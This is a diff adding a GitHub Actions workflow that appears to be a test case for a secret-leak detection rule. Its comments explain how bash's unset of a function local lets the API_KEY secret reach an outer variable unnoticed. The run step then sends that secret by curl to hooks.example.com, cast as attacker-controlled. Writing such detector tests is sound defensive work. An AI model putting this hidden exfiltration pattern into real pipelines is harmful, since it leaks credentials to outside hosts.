@@ -1,0 +1,27 @@
+# situation: on push, a step sets s to x and defines reset, which unsets s;
+#   point makes s local with safe, calls reset, and sets s to the secret
+#   API_KEY. The step calls point and then sends $s in a header to
+#   hooks.example.com with curl.
+# reason: a todo (the same file): the unset in reset takes away the local that
+#   point made, so the assignment in point after reset sets the s of the step:
+#   the secret, which the request carries to the host.
+# cause: the rule keeps the local of point after the unset in reset, and gives
+#   s back x when point returns, so the rule does not read the value that
+#   point set after reset.
+# attack: the attacker takes over the server of the destination, by a breach
+#   of the vendor or by registering the domain when the domain lapses.
+# attack-run-behavior: curl sends the secret to hooks.example.com, whose
+#   server, now the attacker's, logs the secret.
+on: push
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          API_KEY: ${{ secrets.API_KEY }}
+        run: |
+          s=x
+          reset() { unset s; }
+          point() { local s=safe; reset; s="$API_KEY"; }
+          point
+          curl -s -H "x-apikey: $s" https://hooks.example.com/x
